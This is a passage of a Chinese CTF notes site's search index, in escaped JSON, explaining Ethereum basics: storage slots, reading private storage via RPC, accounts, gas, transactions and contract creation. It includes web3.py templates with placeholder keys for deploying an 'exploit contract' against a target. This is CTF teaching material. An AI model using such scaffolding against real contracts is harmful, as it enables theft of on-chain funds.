\u89c4\u5b9a\u4e86\u5408\u7ea6\u5185\u53d8\u91cf\u7684\u5b58\u50a8\u65b9\u5f0f\uff0c\u5927\u81f4\u662f\uff1a \u5355\u4e2a\u503c\u7c7b\u578b \u4ee5\u4f4e\u4f4d\u5bf9\u9f50\uff08\u53f3\u5bf9\u9f50\uff09\u7684\u65b9\u5f0f\u5b58\u50a8\u5728\u4e00\u4e2a\u63d2\u69fd\u4e2d \u4e00\u4e2a\u57fa\u672c\u7c7b\u578b\u53ea\u4f1a\u5360\u636e\u5b83\u6240\u9700\u7684\u7a7a\u95f4\uff0c\u6bd4\u5982 uint8 \u53ea\u4f1a\u5360\u7528 1 \u5b57\u8282 \u5982\u679c\u5f53\u524d\u63d2\u69fd\u8fd8\u53ef\u4ee5\u5bb9\u7eb3\u4e0b\u4e00\u4e2a\u503c\uff0c\u5219\u4e0b\u4e00\u4e2a\u503c\u7ee7\u7eed\u5728\u5f53\u524d\u63d2\u69fd\u5b58\u50a8\uff08\u5728\u5f53\u524d\u503c\u201c\u5de6\u8fb9\u201d\uff09 \u5982\u679c\u5f53\u524d\u63d2\u69fd\u5bb9\u7eb3\u4e0d\u4e0b\u4e0b\u4e00\u4e2a\u503c\uff0c\u5219\u4e0b\u4e00\u4e2a\u503c\u4f1a\u5b58\u50a8\u5728\u4e0b\u4e00\u4e2a\u63d2\u69fd\u4e2d \u5bf9\u4e8e\u7ed3\u6784\u4f53\uff0c\u5b58\u50a8\u65f6\u4e00\u5b9a\u4f1a\u65b0\u5f00\u4e00\u4e2a\u63d2\u69fd\uff0c\u5176\u5185\u90e8\u5b58\u50a8\u4ecd\u7136\u6309\u7167\u4e0a\u9762\u7684\u89c4\u5219 \u4f8b\u5982\u5982\u4e0b\u5408\u7ea6\u7684\u5b58\u50a8\uff1a contract C { address a ; uint8 b ; uint256 c ; bytes24 d ; } // ----------------------------------------------------- // | unused (11) | b (1) | a (20) | <- slot 0 // ----------------------------------------------------- // | c (32) | <- slot 1 // ----------------------------------------------------- // | unused (8) | d (24) | <- slot 2 // ----------------------------------------------------- \u6620\u5c04 \u5373 solidity \u4e2d\u7684 mapping \u4f8b\u5982 mapping(address => uint256) a \u4f1a\u5148\u5728\u5982\u4e0a\u987a\u5e8f\u5b58\u50a8\u4e2d\u5360\u636e\u4e00\u6574\u4e2a\u63d2\u69fd\uff08slot p\uff09 \u6620\u5c04\u4e2d\u952e addr \u5bf9\u5e94\u7684\u503c\u4f1a\u5b58\u5728 keccak256(addr . p) \u7684\u63d2\u69fd\u4e2d\uff08. \u8868\u793a\u8fde\u63a5\uff09 \u52a8\u6001\u6570\u7ec4 \u540c\u6837\u5728\u987a\u5e8f\u5b58\u50a8\u4e2d\u5360\u636e\u4e00\u6574\u4e2a\u63d2\u69fd slot p\uff0c\u5176\u5185\u5bb9\u662f\u8be5\u52a8\u6001\u6570\u7ec4\u73b0\u5728\u7684\u957f\u5ea6 \u6570\u7ec4\u5185\u5bb9\u5b58\u50a8\u7684\u5f00\u5934\u662f slot keccak(p) \u5b57\u8282\u6570\u7ec4\u548c\u5b57\u7b26\u4e32 \u5982\u679c\u957f\u5ea6\u5c0f\u4e8e 32 \u5b57\u8282 \u548c\u5355\u4e2a\u503c\u7c7b\u578b\u4e00\u6837\uff0c\u5b58\u50a8\u5728\u4e00\u4e2a\u63d2\u69fd\u4e2d\uff0c\u9ad8\u4f4d\u5bf9\u9f50\uff08\u5de6\u5bf9\u9f50\uff09 \u8be5\u63d2\u69fd\u6700\u4f4e\u4f4d\u4f1a\u5b58\u50a8 length * 2 \u5982\u679c\u957f\u5ea6\u8d85\u8fc7\u4e86 31 \u5b57\u8282 \u5f53\u524d\u5360\u636e\u4e00\u6574\u4e2a\u63d2\u69fd\uff08slot p\uff09\u5b58\u50a8 length * 2 + 1 \u6570\u7ec4\u5185\u5bb9\u5b9e\u9645\u5b58\u50a8\u7684\u5f00\u5934\u662f slot keccak(p) \u4ee5\u592a\u574a\u4e0a\u7684\u8fd9\u4e9b\u5b58\u50a8\u90fd\u662f\u516c\u5f00\u7684\uff0c\u5373\u4f7f\u5728 Solidity \u4e2d\u89c4\u5b9a\u4e86\u662f private \u53d8\u91cf\uff0c\u4e5f\u4e0d\u4f1a\u5728\u5b58\u50a8\u4e2d\u9690\u85cf\u3002\u8fd9\u4e9b\u5b58\u50a8\u53ef\u4ee5\u901a\u8fc7 rpc \u7684 eth_getStorageAt \u63a5\u53e3\u6765\u8bfb\u53d6\uff0c\u5373 getStorageAt(address, slot)\u3002 \u4ea4\u4e92 \u00b6 \u5728 geth\uff08Go Ethereum\uff09\u5b9e\u73b0\u7684\u4ee5\u592a\u574a\u534f\u8bae\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7 rpc\uff08remote process call\uff0c\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff09\u7684\u65b9\u5f0f\u6765\u548c\u4ee5\u592a\u574a\u7f51\u7edc\u8fdb\u884c\u4ea4\u4e92\u3002 geth \u00b6 geth \u662f\u4ee5\u592a\u574a\u5b98\u65b9\u63d0\u4f9b\u7684\u4e00\u4e2a\u5b9e\u73b0\u4e86\u4ee5\u592a\u574a\u534f\u8bae\u7684\u5ba2\u6237\u7aef\uff0c\u662f\u4ee5\u592a\u574a\u7f51\u7edc\u7684\u4e00\u4e2a\u5165\u53e3\u70b9\u3002geth \u7684 rpc \u63a5\u53e3\u53ef\u4ee5\u901a\u8fc7 http \u6216\u8005 websocket \u6765\u8bbf\u95ee\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 ipc \u6765\u8bbf\u95ee\u3002 \u53ef\u4ee5\u901a\u8fc7 geth \u6765\u521b\u5efa\u8282\u70b9\uff0c\u4e5f\u53ef\u4ee5\u8fde\u63a5\u5230\u5df2\u6709\u7684\u4ee5\u592a\u574a\u7f51\u7edc\u3001\u6d4b\u8bd5\u7f51\u7edc\u3001\u79c1\u6709\u7f51\u7edc\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 geth \u6765\u642d\u5efa\u79c1\u94fe\u3002 \u4e00\u822c\u5bf9\u4e8e CTF \u9898\u76ee\u6765\u8bf4\u4f1a\u6709\u4e00\u4e2a\u5df2\u7ecf\u642d\u597d\u7684\u79c1\u94fe\uff0c\u7136\u540e\u7ed9\u51fa\u4e00\u4e2a rpc \u63a5\u53e3\uff0c\u53ef\u4ee5\u901a\u8fc7 geth attach \u7684\u65b9\u5f0f\u8fde\u63a5\u7136\u540e\u6267\u884c\u547d\u4ee4\u3002\u5177\u4f53\u7684\u547d\u4ee4\u7528\u6cd5\u5c31\u4e0d\u5199\u4e86\u3002 \u4e00\u822c\u7684 CTF \u9898\u76ee\u4f1a\u4f7f\u7528 chainflag/eth-challenge-base \u6765\u642d\u5efa\u73af\u5883\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u79c1\u94fe\u3001\u9632\u706b\u5899\u3001\u6c34\u7ba1\uff08faucet\uff0c\u7528\u4e8e\u53d1\u653e eth\uff09\u4ee5\u53ca\u9898\u76ee\u63a5\u53e3\u3002\u8fd9\u4e2a\u9632\u706b\u5899\u4e3a\u4e86\u9632\u6b62\u722c\u94fe\u627e\u522b\u4eba\u7684\u4ea4\u6613\u4f1a\u53ea\u4fdd\u7559\u51e0\u4e2a rpc \u65b9\u6cd5\uff0c\u901a\u8fc7 geth \u6765\u6267\u884c\u8fd9\u4e9b\u547d\u4ee4\u90e8\u7f72\u5408\u7ea6\u3001\u53d1\u9001\u4ea4\u6613\u662f\u6bd4\u8f83\u4e0d\u65b9\u4fbf\u7684\uff0c\u6240\u4ee5\u4e00\u822c\u4f7f\u7528 web3.js / web3.py \u6765\u8fdb\u884c\u4ea4\u4e92\u3002 web3.py \u00b6 web3.py \u662f\u4e00\u4e2a python \u7684\u4ee5\u592a\u574a rpc \u5ba2\u6237\u7aef\u3002\u7531\u4e8e challenge base \u7684\u9632\u706b\u5899\u53ea\u7559\u4e0b\u4e86\u6781\u5c11\u65b9\u6cd5\uff0c\u6240\u4ee5\u53d1\u9001\u4ea4\u6613\u65f6\u8981\u5148 sighTransaction \u624b\u52a8\u7b7e\u7f72\uff0c\u7136\u540e sendRawTransaction \u53d1\u9001\u4ea4\u6613\u6570\u636e\u3002 \u5e38\u7528\u4ea4\u4e92\u4ee3\u7801\uff1a from web3 import Web3 # from rich import print w3 = Web3 ( Web3 . HTTPProvider ( '...' )) hacker = '...' target = '...' privateKey = '...' def get_txn ( src , dst , data , value = 0 , gas = 0x200000 ): return { \"chainId\" : w3 . eth . chainId , \"from\" : src , \"to\" : dst , \"gasPrice\" : w3 . toWei ( 1.1 , 'gwei' ), \"gas\" : gas , \"value\" : w3 . toWei ( value , 'ether' ), \"nonce\" : w3 . eth . getTransactionCount ( src ), \"data\" : data } def transact ( src , dst , data , value = 0 , gas = 0x200000 ): data = get_txn ( src , dst , data , value , gas ) transaction = w3 . eth . account . signTransaction ( data , privateKey ) . rawTransaction txn_hash = w3 . eth . sendRawTransaction ( transaction ) . hex () txn_receipt = w3 . eth . waitForTransactionReceipt ( txn_hash ) return txn_receipt print ( \"[+] Deploying exploit contract...\" ) txn_receipt = transact ( hacker , None , bytes . fromhex ( \"...\" )) print ( txn_receipt ) print ( \"[*] Exploit contract deployed at\" , txn_receipt [ 'contractAddress' ]) contractAddress = txn_receipt [ 'contractAddress' ] from web3 import Web3 , HTTPProvider # from rich import print import json w3 = Web3 ( HTTPProvider ( '...' )) hacker = \"...\" target = \"...\" privateKey = \"...\" def run ( sender , func , value = 0 , gas = 0x200000 ): txn = func . buildTransaction ({ 'nonce' : w3 . eth . getTransactionCount ( sender ), 'gas' : gas , 'gasPrice' : w3 . toWei ( 1.1 , 'gwei' ), \"value\" : w3 . toWei ( value , 'ether' ), }) if gas == None : txn [ 'gas' ] = w3 . eth . estimateGas ( txn ) transaction = w3 . eth . account . signTransaction ( txn , privateKey ) . rawTransaction txn_hash = w3 . eth . sendRawTransaction ( transaction ) . hex () txn_receipt = w3 . eth . waitForTransactionReceipt ( txn_hash ) return txn_receipt bytecode , abi = json . load ( open ( \"Exploit.json\" )) exploitContract = w3 . eth . contract ( abi = abi , bytecode = bytecode ) print ( \"[+] Deploying exploit contract...\" ) txn_receipt = run ( hacker , exploitContract . constructor ( target )) print ( \"[*] Exploit contract deployed at\" , txn_receipt [ 'contractAddress' ]) exploitContract = w3 . eth . contract ( abi = abi , address = txn_receipt [ 'contractAddress' ]) Remix + MetaMask \u00b6 Remix IDE \u63d0\u4f9b\u4e86\u8c03\u8bd5\u7684 Javascript VM\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u8fde\u63a5\u4ee5\u592a\u574a\u4e3b\u94fe\u3001\u6d4b\u8bd5\u94fe\uff0c\u8fd8\u53ef\u4ee5\u76f4\u63a5\u8fde\u63a5\u5230 Web3 Provider\uff0c\u4e5f\u53ef\u4ee5\u8fde\u63a5\u5230 Injected Provider\uff0c\u6bd4\u5982 MetaMask\u3002MetaMask \u4e2d\u4e5f\u53ef\u4ee5\u81ea\u7531\u9009\u62e9\u7f51\u7edc\u3002 \u7136\u540e\u5c31\u53ef\u4ee5\u5728 Remix \u4e2d\u8fdb\u884c\u5408\u7ea6\u7684\u90e8\u7f72\u548c\u8c03\u7528\u4e86\u3002 \u4e0d\u8fc7\u5bf9\u4e8e CTF \u9898\u76ee\u6765\u8bf4\u53ef\u80fd\u4e0d\u592a\u597d\u7528\u3002\u6211\u4e00\u822c\u4f1a\u9009\u62e9\u5728 JS VM \u4e2d\u8c03\u8bd5\u597d\u540e\u901a\u8fc7 web3.py \u6765\u4ea4\u4e92\u3002","title":"\u4ee5\u592a\u574a\u57fa\u7840"},{"location":"ctf/blockchain/eth/basic/#_1","text":"Abstract \u4e00\u4e9b ETH \u9898\u76ee\u4e2d\u4f1a\u7528\u5230\u7684\u4ee5\u592a\u574a\u57fa\u7840\u77e5\u8bc6","title":"\u4ee5\u592a\u574a\u57fa\u7840"},{"location":"ctf/blockchain/eth/basic/#_2","text":"Remix \uff1a\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6 IDE MetaMask \uff1a\u4ee5\u592a\u574a\u94b1\u5305 Etherscan \uff1a\u4ee5\u592a\u574a\u533a\u5757\u94fe\u6d4f\u89c8\u5668 geth \uff1a\u4ea4\u4e92\u5de5\u5177","title":"\u57fa\u7840\u73af\u5883"},{"location":"ctf/blockchain/eth/basic/#_3","text":"\u4ee5\u592a\u574a\u4e2d\u7684\u8d26\u6237\uff08Account\uff09\u5206\u4e3a\u4e24\u7c7b\uff0c\u5206\u522b\u662f\u5916\u90e8\u8d26\u6237\uff08Externally Owned Account, EOA\uff09\u548c\u5408\u7ea6\u8d26\u6237\uff08Contract Account\uff09\u3002 \u5916\u90e8\u8d26\u6237 \u7531\u4eba\u521b\u5efa\u7684\uff0c\u76f8\u5f53\u4e8e\u94b1\u5305\uff0c\u53ef\u4ee5\u5b58\u50a8\u4ee5\u592a\u5e01\uff0c\u53d1\u9001\u4ea4\u6613\u7b49 \u6bcf\u4e2a\u5916\u90e8\u8d26\u6237\u90fd\u6709\u4e00\u5bf9\u516c\u79c1\u94a5\uff0c\u7528\u4e8e\u7b7e\u7f72\u4ea4\u6613\u7b49 \u79c1\u94a5\u662f\u4e00\u4e2a 256 \u4f4d\u6570\uff0832 \u5b57\u8282\uff09 \u516c\u94a5\u7531\u79c1\u94a5\u7ecf ECDSA \u8ba1\u7b97\u800c\u6765\uff0c\u662f\u4e00\u4e2a 64 \u5b57\u8282\u7684\u6570 \u5730\u5740\u662f\u516c\u94a5\u8ba1\u7b97 keccak256 \u54c8\u5e0c\u540e\u53d6\u540e 20 \u5b57\u8282\u7684\u503c\uff08\u4e00\u822c\u8868\u793a\u4e3a 0x + 40 \u4e2a\u5341\u516d\u8fdb\u5236\u5b57\u7b26\uff09 \u5408\u7ea6\u8d26\u6237 \u5408\u7ea6\u8d26\u6237\u662f\u7531\u5916\u90e8\u8d26\u6237\u901a\u8fc7\u4ea4\u6613\u521b\u5efa\u7684\u8d26\u6237\uff0c\u5176\u4e2d\u5305\u542b\u5408\u7ea6\u4ee3\u7801 \u5408\u7ea6\u5730\u5740 CREATE \u64cd\u4f5c\u7801\uff1a\u901a\u8fc7\u521b\u5efa\u8005\u5730\u5740\u3001\u4ea4\u6613\u7684 nonce \u503c\u5171\u540c\u8ba1\u7b97 keccak256 \u54c8\u5e0c\u5f97\u5230 CREATE2 \u64cd\u4f5c\u7801\uff08\u541b\u58eb\u5766\u4e01\u5821\u786c\u5206\u53c9\u540e\uff09\uff1a\u901a\u8fc7\u521b\u5efa\u8005\u5730\u5740\u3001\u76d0\u503c\u3001\u5408\u7ea6\u521b\u5efa\u4ee3\u7801\u8ba1\u7b97\u5f97\u5230 \u5408\u7ea6\u8d26\u6237\u540c\u6837\u4e5f\u53ef\u4ee5\u5b58\u50a8\u3001\u62e5\u6709\u4ee5\u592a\u5e01 \u5411\u4e00\u4e2a\u5408\u7ea6\u8d26\u6237\u53d1\u9001\u4ea4\u6613\u76f8\u5f53\u4e8e\u8c03\u7528\u5408\u7ea6\u4e2d\u7684\u51fd\u6570 \u5408\u7ea6\u8d26\u6237\u4e0d\u80fd\u81ea\u884c\u53d1\u8d77\u4ea4\u6613\uff0c\u4f46\u53ef\u4ee5\u5728\u88ab\u8c03\u7528\u65f6\u5411\u5916\u53d1\u9001\u4ea4\u6613 \u8fd9\u4e24\u7c7b\u8d26\u6237\u90fd\u662f \u201c\u72b6\u6001\u5bf9\u8c61\u201d\uff0c\u4e00\u4e2a\u4ee5\u592a\u574a\u8d26\u6237\u5305\u542b\uff1a nonce\uff1a\u5df2\u7ecf\u53d1\u9001\u7684\u4ea4\u6613\u6570\u91cf balance\uff1a\u8d26\u6237\u4f59\u989d\uff0c\u5373\u5b58\u50a8\u7684\u4ee5\u592a\u5e01\u6570\u91cf storageRoot\uff1a\u5b58\u50a8\u533a\u7684\u54c8\u5e0c\u503c\uff0c\u6307\u5411\u5408\u7ea6\u8d26\u6237\u7684\u5b58\u50a8\u6570\u636e\u533a codeHash\uff1a\u4ee3\u7801\u533a\u7684\u54c8\u5e0c\u503c\uff0c\u6307\u5411\u5408\u7ea6\u8d26\u6237\u5b58\u50a8\u7684\u667a\u80fd\u5408\u7ea6\u4ee3\u7801","title":"\u8d26\u6237"},{"location":"ctf/blockchain/eth/basic/#_4","text":"\u4ee5\u592a\u5e01\u7684\u6700\u5c0f\u5355\u4f4d\u662f wei\uff0c\u5176\u662f\u4e00\u4e2a\u5f88\u5c0f\u7684\u5355\u4f4d\uff0c\u4e00\u4e9b\u5176\u4ed6\u5355\u4f4d\uff1a 1 Kwei (1 Babbage) = \\(10^3\\) wei 1 Mwei (1 Lovelace) = \\(10^6\\) wei 1 Gwei (1 Shannon) = \\(10^9\\) wei 1 Szabo (1 microether) = \\(10^{12}\\) wei 1 Finney (1 milliether) = \\(10^{15}\\) wei 1 Ether = \\(10^{18}\\) wei \u5355\u4f4d\u6362\u7b97\uff1a Ethereum Unit Converter","title":"\u4ee5\u592a\u5e01\u5355\u4f4d"},{"location":"ctf/blockchain/eth/basic/#_5","text":"\u4ee5\u592a\u574a\u4e2d\u7684\u4ea4\u6613\uff08Transaction\uff09\u6307\u7684\u662f\u4ece\u4e00\u6761\u8d26\u6237\u53d1\u9001\u5230\u53e6\u4e00\u6761\u8d26\u6237\u7684\u6d88\u606f\u7684\u7b7e\u540d\u6570\u636e\u5305\uff0c\u65e0\u8bba\u662f\u8f6c\u8d26\u8fd8\u662f\u521b\u5efa\u667a\u80fd\u5408\u7ea6\u3001\u8c03\u7528\u667a\u80fd\u5408\u7ea6\u90fd\u662f\u901a\u8fc7\u4ea4\u6613\u8fdb\u884c\u7684\u3002\u6bcf\u4e00\u7b14\u4ea4\u6613\u4e5f\u4f1a\u652f\u4ed8\u4e00\u5b9a\u7684\u624b\u7eed\u8d39\u3002","title":"\u4ea4\u6613"},{"location":"ctf/blockchain/eth/basic/#_6","text":"\u4e00\u6761\u4ea4\u6613\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\uff1a from\uff1a\u4ea4\u6613\u53d1\u9001\u8005\u5730\u5740 to\uff1a\u4ea4\u6613\u63a5\u6536\u8005\u5730\u5740\uff0c\u5982\u679c\u4e3a\u7a7a\u5219\u8868\u793a\u662f\u5728\u521b\u5efa\u667a\u80fd\u5408\u7ea6 value\uff1a\u4ea4\u6613\u91d1\u989d\uff0c\u5373\u53d1\u9001\u65b9\u8981\u7ed9\u63a5\u6536\u65b9\u8f6c\u79fb\u7684\u4ee5\u592a\u5e01\u6570\u91cf\uff08wei \u4e3a\u5355\u4f4d\uff09 data\uff1a\u4ea4\u6613\u6570\u636e\uff0c\u5982\u679c\u662f\u521b\u5efa\u667a\u80fd\u5408\u7ea6\u5219\u662f\u667a\u80fd\u5408\u7ea6\u4ee3\u7801\uff0c\u5982\u679c\u662f\u8c03\u7528\u667a\u80fd\u5408\u7ea6\u5219\u662f\u8c03\u7528\u7684\u51fd\u6570\u540d\u548c\u53c2\u6570 gasPrice\uff1a\u4ea4\u6613\u7684 gas \u4ef7\u683c\uff0c\u5373\u6bcf\u5355\u4f4d gas \u7684\u4ef7\u683c\uff08wei \u4e3a\u5355\u4f4d\uff09 gasLimit\uff1a\u4ea4\u6613\u7684 gas \u4e0a\u9650\uff0c\u5373\u4ea4\u6613\u5141\u8bb8\u6267\u884c\u7684\u6700\u5927 gas \u6570\u91cf nonce\uff1a\u4ea4\u6613\u7684\u5e8f\u53f7\uff0c\u5373\u53d1\u9001\u8005\u5df2\u7ecf\u53d1\u9001\u7684\u4ea4\u6613\u6570\u91cf \u9664\u6b64\u4e4b\u5916\u53d1\u9001\u7684\u4ea4\u6613\u6570\u636e\u5305\u8fd8\u9700\u8981\u5305\u542b\uff1a hash\uff1a\u4ea4\u6613\u7684\u54c8\u5e0c\u503c\uff0c\u7531\u524d\u9762\u7684\u5185\u5bb9\u548c chainId \u8ba1\u7b97\u5f97\u5230 v\u3001r\u3001s\uff1a\u4ea4\u6613\u7b7e\u540d\u7684\u4e09\u4e2a\u90e8\u5206\uff0c\u7531\u53d1\u9001\u8005\u79c1\u94a5\u5bf9\u4ea4\u6613\u54c8\u5e0c\u503c\u8fdb\u884c\u7b7e\u540d\u5f97\u5230","title":"\u4ea4\u6613\u5185\u5bb9"},{"location":"ctf/blockchain/eth/basic/#_7","text":"\u4ee5\u592a\u574a\u7684\u4ea4\u6613\u53ef\u4ee5\u5206\u4e3a\u4e09\u79cd\u573a\u666f\uff1a \u8f6c\u8d26\u4ea4\u6613\uff1a\u4ece\u4e00\u4e2a\u8d26\u6237\u5411\u53e6\u4e00\u4e2a\u8d26\u6237\u53d1\u9001\u4ee5\u592a\u5e01 \u5fc5\u987b\u8981\u6307\u5b9a from\u3001to\u3001value\uff0c\u5206\u522b\u8868\u793a\u53d1\u9001\u8005\u3001\u63a5\u6536\u8005\u3001\u8f6c\u79fb\u7684\u4ee5\u592a\u5e01\u6570\u91cf\uff08\u5176\u5b83\u5b57\u6bb5\u6709\u9ed8\u8ba4\u503c\uff09 \u4ea4\u6613\u6570\u636e\u5305\u4e2d\u7684 data \u4e3a\u7a7a \u63a5\u6536\u65b9\u53ef\u4ee5\u662f EOA \u4e5f\u53ef\u4ee5\u662f\u5408\u7ea6\u8d26\u6237 \u521b\u5efa\u5408\u7ea6\u4ea4\u6613\uff1a\u521b\u5efa\u4e00\u4e2a\u5408\u7ea6\u8d26\u6237\uff08\u5c06\u5408\u7ea6\u90e8\u7f72\u5230\u94fe\u4e0a\uff09 \u5fc5\u987b\u8981\u6307\u5b9a from\u3001data\uff0c\u5206\u522b\u8868\u793a\u53d1\u9001\u8005\u3001\u5408\u7ea6\u4ee3\u7801\uff08\u7f16\u8bd1\u540e\u7684\u5b57\u8282\u7801\uff09 \u4ea4\u6613\u6570\u636e\u5305\u4e2d\u7684 to \u4e3a\u7a7a \u8c03\u7528\u5408\u7ea6\u4ea4\u6613\uff1a\u8c03\u7528\u4e00\u4e2a\u5408\u7ea6\u8d26\u6237\u7684\u51fd\u6570 \u5fc5\u987b\u8981\u6307\u5b9a from\u3001to\u3001data\uff0c\u5206\u522b\u8868\u793a\u53d1\u9001\u8005\u3001\u63a5\u6536\u8005\u3001\u8c03\u7528\u7684\u4fe1\u606f data \u5b57\u6bb5\u662f\u7f16\u7801\u540e\u7684\u51fd\u6570\u540d\uff08\u9009\u62e9\u5b50\uff09\u548c\u53c2\u6570","title":"\u4e09\u79cd\u4ea4\u6613"},{"location":"ctf/blockchain/eth/basic/#_8","text":"\u6bcf\u7b14\u4ea4\u6613\u90fd\u9700\u8981\u652f\u4ed8\u4e00\u5b9a\u7684\u624b\u7eed\u8d39\uff0c\u6765\u8865\u507f\u6267\u884c\u65f6\u7684\u8ba1\u7b97\u5f00\u9500\uff0c\u540c\u65f6\u4e5f\u4f1a\u652f\u4ed8\u7ed9\u77ff\u5de5\u4f5c\u4e3a\u6253\u5305\u4ea4\u6613\u7684\u5956\u52b1\u3002 \u624b\u7eed\u8d39\u4e0d\u662f\u7531\u4ee5\u592a\u5e01\u76f4\u63a5\u8ba1\u7b97\u7684\uff0c\u800c\u662f\u901a\u8fc7 gas \u6765\u4f5c\u4e3a\u5355\u4f4d\uff0c\u901a\u8fc7 gasPrice \u4e0e\u4ee5\u592a\u5e01\u8fdb\u884c\u6362\u7b97\u3002 gasPrice \u662f\u4e00\u5355\u4f4d gas \u5bf9\u5e94\u7684\u4ee5\u592a\u5e01\u4ef7\u503c\uff08wei \u4e3a\u5355\u4f4d\uff09\uff0cgasLimit \u662f\u4ea4\u6613\u53d1\u9001\u8005\u613f\u610f\u4e3a\u8fd9\u7b14\u4ea4\u6613\u652f\u4ed8\u7684\u6700\u5927 gas \u6570\u91cf\u3002\u5728\u4ea4\u6613\u6267\u884c\u65f6\uff0c\u4f1a\u6d88\u8017 gas\uff0c\u5982\u679c\u6d88\u8017\u7684 gas \u6570\u91cf\u5c0f\u4e8e gasLimit\uff0c\u5219\u4ea4\u6613\u6210\u529f\u6267\u884c\uff0c\u77ff\u5de5\u4f1a\u6536\u53d6\u5b9e\u9645\u6d88\u8017\u7684 gas * gasPrice \u7684\u624b\u7eed\u8d39\uff1b\u5982\u679c\u6267\u884c\u8fc7\u7a0b\u4e2d\u6d88\u8017\u7684 gas \u8d85\u8fc7\u4e86 gasLimit\uff0c\u5219\u4ea4\u6613\u5931\u8d25\uff0c\u4f1a\u56de\u6eda\uff08revert\uff09\u5230\u4ea4\u6613\u6267\u884c\u524d\u7684\u72b6\u6001\uff0c\u540c\u65f6\u77ff\u5de5\u4f1a\u6536\u53d6 gasLimit * gasPrice \u7684\u624b\u7eed\u8d39\u3002","title":"\u4ea4\u6613\u624b\u7eed\u8d39"},{"location":"ctf/blockchain/eth/basic/#_9","text":"\u5408\u7ea6\u8d26\u6237\u548c\u521b\u5efa\u5408\u7ea6\u3001\u8c03\u7528\u5408\u7ea6\u7684\u4ea4\u6613\u5728\u524d\u9762\u5df2\u7ecf\u8bf4\u8fc7\u4e86\u3002\u4e0b\u9762\u662f\u4e00\u4e9b\u5173\u4e8e\u5408\u7ea6\u7684\u5b9e\u73b0\u3001\u539f\u7406\u7b49\u5185\u5bb9\u3002","title":"\u5408\u7ea6"},{"location":"ctf/blockchain/eth/basic/#_10","text":"\u5408\u7ea6\u4e00\u822c\u662f\u4f7f\u7528 Solidity \u8bed\u8a00\u8fdb\u884c\u7f16\u5199\u7684\uff0c\u9664\u6b64\u4e4b\u5916\u4e5f\u6709 Yul \u7b49\u8bed\u8a00\u3002\u5173\u4e8e Solidity \u7684\u8bed\u6cd5\u5c31\u4e0d\u5728\u8fd9\u91cc\u5199\u4e86\u3002 \u5408\u7ea6\u7f16\u5199\u540e\u9700\u8981\u901a\u8fc7\u7f16\u8bd1\u5668\u7f16\u8bd1\u6210 EVM \u53ef\u6267\u884c\u7684\u5b57\u8282\u7801\u3002\u76f8\u5173\u5b57\u8282\u7801\u5728\u53e6\u5916\u7684\u7ae0\u8282\u6765\u5199\uff08TODO\uff09 \u603b\u4e4b\u53ef\u4ee5\u4f7f\u7528 Remix IDE \u6765\u8fdb\u884c\u5408\u7ea6\u7684\u7f16\u5199\u3001\u7f16\u8bd1\u3001\u90e8\u7f72\u3001\u8c03\u8bd5\u7b49\u64cd\u4f5c\u3002","title":"\u7f16\u5199\u5408\u7ea6"},{"location":"ctf/blockchain/eth/basic/#_11","text":"\u524d\u9762\u8bf4\u5230\u4e86\u5408\u7ea6\u8981\u901a\u8fc7\u4ea4\u6613\u6765\u8fdb\u884c\u521b\u5efa\uff0c\u8fd9\u4e2a\u4ea4\u6613\u7684 to \u5b57\u6bb5\u5e94\u8be5\u4e3a\u7a7a\uff0c\u4e14 data \u5b57\u6bb5\u4e3a\u7f16\u8bd1\u540e\u7684\u5408\u7ea6\u5b57\u8282\u7801\u3002 \u5728\u6267\u884c\u4ea4\u6613\u65f6\uff0c\u8fd9\u4e2a data \u5b57\u6bb5\u7684\u5185\u5bb9\u4f1a\u88ab\u653e\u5728 EVM \u4e0a\u6267\u884c\uff0c\u5b83\u53ef\u4ee5\u662f\u4efb\u610f\u53ef\u6267\u884c\u7684\u5b57\u8282\u7801\uff0c\u9047\u5230 return \u6307\u4ee4\u76f4\u63a5\u8fd4\u56de\uff0c\u4e5f\u53ef\u4ee5\u8fd4\u56de\u7ed3\u679c\uff08\u4e14\u6709\u56de\u663e\uff09\u3002 \u4e00\u822c\u7684\u5408\u7ea6\u5b57\u8282\u7801\u4f1a\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\uff0c\u5373 creationCode \u548c runtimeCode\u3002\u5b83\u4eec\u662f\u62fc\u63a5\u5728\u4e00\u8d77\u7684\u4e00\u4e2a\u6574\u4f53\u3002\u5728 EVM \u8fd0\u884c\u5b57\u8282\u7801\u65f6\uff0c\u5148\u6267\u884c creationCode \u90e8\u5206\uff0c\u5176\u4f5c\u7528\u662f\u8fd0\u884c\u6784\u5efa\u51fd\u6570\u3001\u8bbe\u7f6e\u5408\u7ea6\u521d\u59cb\u72b6\u6001\uff0c\u7136\u540e\u8fd4\u56de runtimeCode\uff0c\u8fd9\u4e2a\u5c06\u4f1a\u88ab\u90e8\u7f72\u5230\u94fe\u4e0a\u4ee3\u7801\u533a\u3002\u4e4b\u540e\u5728\u94fe\u4e0a\u5b58\u50a8\u7684\u5c31\u53ea\u662f runtimeCode \u90e8\u5206\uff0c\u4e5f\u662f\u8c03\u7528\u65f6\u4f1a\u6267\u884c\u7684\u5b9e\u9645\u90e8\u5206\u3002 \u5982\u679c\u5408\u7ea6\u7684\u6784\u5efa\u51fd\u6570\u662f payable \u7684\uff0c\u90a3\u4e48\u53ef\u4ee5\u5728\u521b\u5efa\u4ea4\u6613\u7684\u65f6\u5019\u901a\u8fc7 value \u5b57\u6bb5\u6765\u9644\u5e26\u4ee5\u592a\u5e01\uff0c\u8fd9\u4e9b\u4ee5\u592a\u5e01\u4f1a\u88ab\u8f6c\u79fb\u5230\u5408\u7ea6\u8d26\u6237\u4e2d\u3002\u5982\u679c\u4e0d\u662f payable \u4f46\u521b\u5efa\u65f6\u5411\u5176\u8f6c\u8d26\u4e86\uff0c\u90a3\u4e48\u8fd9\u6761\u4ea4\u6613\u4f1a revert\u3002","title":"\u5408\u7ea6\u7684\u521b\u5efa"},{"location":"ctf/blockchain/eth/basic/#_12","text":"\u5408\u7ea6\u7684\u8c03\u7528\u4e5f\u662f\u901a\u8fc7\u4ea4\u6613\u6765\u8fdb\u884c\u7684\uff0c\u8fd9\u4e2a\u4ea4\u6613\u7684 to 